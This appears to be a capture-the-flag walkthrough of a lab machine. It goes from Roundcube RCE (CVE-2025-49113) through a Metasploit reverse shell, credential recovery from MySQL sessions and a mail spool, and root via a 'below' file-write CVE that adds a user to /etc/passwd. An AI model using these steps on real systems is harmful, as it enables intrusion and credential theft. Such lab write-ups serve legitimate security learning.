# Outbound

## Reconnaissance

We use nmap to find open ports and services on the target machine.

```bash
sudo nmap -sS -sV -A <target_ip>
```

And we find an open port 80 for HTTP service and 22 for SSH service.

## Web RCE

We found that the website is an RoundCube webmail service. We can find the version of the RoundCube in `http://<target_ip>/?_task=mail&_mbox=INBOX#` and `about`. The version is 1.6.10. So we can find an CVE that allows RCE in RoundCube version ≤ 1.5.9 and ≤ 1.6.10.
We can use the exploit from `https://github.com/00xCanelo/CVE-2025-49113`. But i cannot achieve to have an reverse shell thanks to this POC.

So i decided to use metasploit to exploit this vulnerability.

```bash
msfconsole
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set RHOSTS http://<target_ip>
set PASSWORD <password>
set USERNAME <username>
set LHOST <your_ip>
shell
script /dev/null -c bash # To have a proper bash shell
```

And we have a shell on the target machine as www-data user.
And we can `su` as tyler user with the password that he have used to connect to the RoundCube webmail.

## First Escalation of privilege

We can import linpeas.sh via wget. And execute it to find some privilege escalation vectors. We find that an mysql database is running and the password and user is hardcoded in `/var/www/html/roundcube/config/config.inc.php`.

So we can connect to the mysql database with the following command:

```bash
mysql -u roundcube -p -h localhost -P 3306 roundcube
```

And we can see that there is a table called `users` that contains the password hashes of the users. But i cannot achieve to crack the hashes.
So i decided to take a look to the table `sessions`. We can see a lot of session data encoded in base64. So we can extract all sessions and decode them.

```bash
mysql -u roundcube -p -h localhost -P 3306 -B -e "SELECT * FROM session" roundcube > sessions.tsv
tail -n +2 sessions.tsv | awk -F'\t' '{print $1 "\t" $4}' | while IFS=$'\t' read id data; do
```

And we find the hashed password of the jacob user. We can use a special github to decipher this hash because this use DES encryption and we have the key inside the config file `/var/www/html/roundcube/config/config.inc.php`.

I use this github: [Password Decrypt Rcube](https://github.com/rafelsusanto/rcube-password-decryptor)
And we got the jacob password. So we can `su` as jacob user.

## Pivot via ssh

Thanks to the jacob user and linpeas.sh, we find the log of mail in `/var/mail/jacob`. Inside the log we find password for the jacob user that he had to change but he didn't.
So try to ssh as jacob user with this password. And we are able to connect via ssh as jacob user.


## Final Escalation of Privilege

Just use `sudo -l` to see the sudo rights of the jacob user. And we can see that jacob can execute `below` as root without password.
We can try to find a CVE to elevate our privilege via below. And we find CVE-2025-27591 that allows use to arbitrary file write via below.
So add a new root user in the `/etc/passwd` file with this following [github CVE-2025-27591](https://github.com/HOEUN-Visai/CVE-2025-27591-below-)

And we can become root via `su` with the password that we set in the `/etc/passwd` file.
